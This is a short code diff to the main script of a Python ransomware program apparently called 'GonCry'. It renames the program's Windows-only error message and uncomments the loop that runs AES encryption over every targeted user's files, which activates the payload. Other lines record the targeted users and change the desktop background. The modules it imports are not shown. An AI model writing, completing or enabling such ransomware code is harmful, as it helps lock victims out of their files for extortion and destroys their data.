@@ -11,7 +11,7 @@ crypter = aes.AES(KEY)
 if __name__ == "__main__":
     # If the operating system is not windows; exit.
     if sys.platform != 'win32':
-        sys.exit('ERROR: Ransomware only supports windows.')
+        sys.exit('ERROR: GonCry only supports windows.')
 
     # Write the users that failed and succeeded and change the background.
     files.write_users()
@@ -19,5 +19,5 @@ if __name__ == "__main__":
     background.changeBG(background.get_background())
 
     # Encryption progress.
-    #for user in files.get_targeted_users():
-    #    crypter.encrypt_root(user)
+    for user in files.get_targeted_users():
+        crypter.encrypt_root(user)
